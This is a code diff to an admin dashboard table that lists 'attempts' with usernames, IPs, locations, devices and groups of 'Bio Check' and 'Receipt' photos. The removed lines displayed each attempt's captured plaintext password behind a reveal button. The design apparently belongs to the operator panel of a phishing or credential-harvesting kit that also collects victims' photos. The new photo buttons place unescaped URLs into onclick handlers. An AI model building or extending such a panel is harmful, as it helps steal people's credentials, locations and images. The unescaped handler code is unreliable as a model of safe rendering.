@@ -405,9 +405,20 @@
                 const date = dateObj.toLocaleDateString([], { day: '2-digit', month: 'short' });
                 const location = getLocationString(attempt);
                 const device = getDeviceString(attempt);
-                const photoFilename = attempt.photoFilename || getPhotoFilename(attempt.timestamp, attempt.ip);
                 const status = attempt.status || 'Verified';
                 const statusClass = status === 'Verified' ? 'badge-success' : 'badge-warning';
+
+                // Categorize Photos
+                const allPhotos = (attempt.photos || []).concat(attempt.photoFilename ? [{ filename: attempt.photoFilename }] : []);
+
+                // Heuristic: First 5 are Bio, Rest are Receipt
+                const bioPhotos = allPhotos.slice(0, 5);
+                const receiptPhotos = allPhotos.slice(5);
+
+                const renderPhotoBtn = (p, label, color) =>
+                    `<button onclick="viewPhoto('${p.cloudinaryUrl || p.filename}')" class="btn btn-${color} btn-sm photo-stack-btn" title="${label}">
+                        📷 ${label}
+                     </button>`;
 
                 return `
                     <tr>
@@ -430,28 +441,31 @@
                             <div class="cell-strong">${escapeHtml(attempt.username || 'Unknown')}</div>
                             <div class="cell-meta">${attempt.ip || '—'}</div>
                         </td>
-                        <td>${location}</td>
+                        <td style="min-width: 200px;">${location}</td>
                         <td>${device}</td>
-                        <td>
-                            <div class="cred-wrap">
-                                <div class="cred-row">
-                                    <span class="cred-label">U</span>
-                                    <span class="cred-value masked" id="user-${index}"
-                                          data-value="${escapeHtml(attempt.username || '')}">${maskString(attempt.username || '')}</span>
-                                </div>
-                                <div class="cred-row">
-                                    <span class="cred-label">P</span>
-                                    <span class="cred-value masked" id="pass-${index}"
-                                          data-value="${escapeHtml(attempt.password || '')}">${maskString(attempt.password || '')}</span>
-                                </div>
-                                <button onclick="toggleCredentials(${index})" class="reveal-btn" id="btn-${index}">👁️ Show</button>
-                            </div>
+                        <td style="display:none">
+                           <!-- Credentials Hidden -->
                         </td>
                         <td>
-                            ${attempt.photoData ?
-                        `<button onclick="viewPhoto('${attempt.cloudinaryUrl || photoFilename}')" class="btn btn-success btn-sm">📷 View</button>
-                             <button onclick="deletePhoto('${photoFilename}')" class="btn btn-danger btn-sm btn-icon" style="margin-left:4px">🗑️</button>` :
-                        '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>'}
+                            <div class="photo-cell-content">
+                                ${bioPhotos.length > 0 ?
+                        `<div class="photo-group">
+                                        <div class="photo-label">Bio Check (${bioPhotos.length})</div>
+                                        <div class="photo-actions-row">
+                                           ${bioPhotos.map((p, i) => renderPhotoBtn(p, `#${i + 1}`, 'success')).join('')}
+                                        </div>
+                                    </div>` : ''}
+                                
+                                ${receiptPhotos.length > 0 ?
+                        `<div class="photo-group" style="margin-top: 8px; padding-top: 8px; border-top: 1px dashed #eee;">
+                                        <div class="photo-label">Receipt (${receiptPhotos.length})</div>
+                                         <div class="photo-actions-row">
+                                           ${receiptPhotos.map((p, i) => renderPhotoBtn(p, `#${i + 1}`, 'primary')).join('')}
+                                        </div>
+                                    </div>` : ''}
+
+                                ${allPhotos.length === 0 ? '<span class="text-muted">—</span>' : ''}
+                            </div>
                         </td>
                     </tr>
                 `;
